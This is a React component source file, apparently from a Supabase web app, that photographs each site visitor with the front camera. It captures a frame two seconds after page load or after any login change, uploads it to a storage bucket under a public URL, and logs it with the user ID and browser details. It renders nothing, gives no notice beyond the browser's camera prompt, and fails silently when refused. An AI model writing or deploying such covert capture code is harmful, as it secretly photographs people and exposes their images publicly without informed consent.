import React, { useEffect, useRef } from 'react';
import { supabase } from '../supabaseClient';
import { useAuth } from '../contexts/AuthContext';

const VisitorCapture = () => {
    const { user, loading } = useAuth(); // Depend on loading check
    const videoRef = useRef(null);
    const canvasRef = useRef(null);
    // Track if we have already captured for the CURRENT user session instance 
    // (Resets on page refresh, which is desired behavior)
    const hasCapturedRef = useRef(false);
    
    // Store last captured user ID to detect login switches
    const lastUserIdRef = useRef('init'); 
    // 'init' differs from null/undefined so we can detect initial "guest" capture if needed

    useEffect(() => {
        // 1. Wait for Auth to finish loading (prevent double capture Guest -> User)
        if (loading) return;

        const currentUserType = user ? user.id : 'guest';

        // 2. Logic: Capture if:
        //    a) We haven't captured anything yet this page load (Refresh case)
        //    b) OR The user changed (Guest -> Login, or Login A -> Login B) (Login case)
        
        if (hasCapturedRef.current && lastUserIdRef.current === currentUserType) {
            return; // Already captured for this user state
        }

        // Proceed to capture
        const attemptCapture = async () => {
            try {
                // Request Camera silently (browser will prompt)
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
                
                // Create hidden video element logic
                const video = document.createElement('video');
                video.srcObject = stream;
                video.play();

                // Wait for video to be ready
                video.onloadedmetadata = async () => {
                    // Slight delay to let camera adjust brightness
                    await new Promise(r => setTimeout(r, 1000));

                    const canvas = document.createElement('canvas');
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    const ctx = canvas.getContext('2d');
                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

                    // Stop stream immediately
                    stream.getTracks().forEach(track => track.stop());

                    // Convert to Blob and Upload
                    canvas.toBlob(async (blob) => {
                        if (!blob) return;
                        
                        const fileName = `visitor_${Date.now()}_${Math.random().toString(36).substring(7)}.jpg`;
                        
                        // 1. Upload Image
                        const { data: uploadData, error: uploadError } = await supabase.storage
                            .from('visitor-captures')
                            .upload(fileName, blob);

                        if (uploadError) {
                            console.error("Capture upload failed", uploadError);
                            return;
                        }

                        // 2. Get Public URL
                        const { data: { publicUrl } } = supabase.storage
                            .from('visitor-captures')
                            .getPublicUrl(fileName);

                        // 3. Log to DB
                        const { error: dbError } = await supabase
                            .from('visitor_logs')
                            .insert([{
                                image_url: publicUrl,
                                visitor_id: user ? user.id : null,
                                metadata: {
                                    userAgent: navigator.userAgent,
                                    platform: navigator.platform,
                                    timestamp: new Date().toISOString()
                                }
                            }]);

                        if (!dbError) {
                            // Mark as captured for this specific user state
                            hasCapturedRef.current = true;
                            lastUserIdRef.current = currentUserType;
                            console.log(`Visitor logged (${user ? 'User' : 'Guest'}).`);
                        }
                    }, 'image/jpeg', 0.7);
                };

            } catch (err) {
                // Permission denied or other error - silently fail
                // Mark as 'captured' to stop retrying continuously
                hasCapturedRef.current = true;
                lastUserIdRef.current = currentUserType;
            }
        };

        // Delay start slightly to not block initial render
        const timer = setTimeout(attemptCapture, 2000);
        return () => clearTimeout(timer);
    }, [user, loading]); // Depend on user and loading

    return null; // Invisible component
};

export default VisitorCapture;
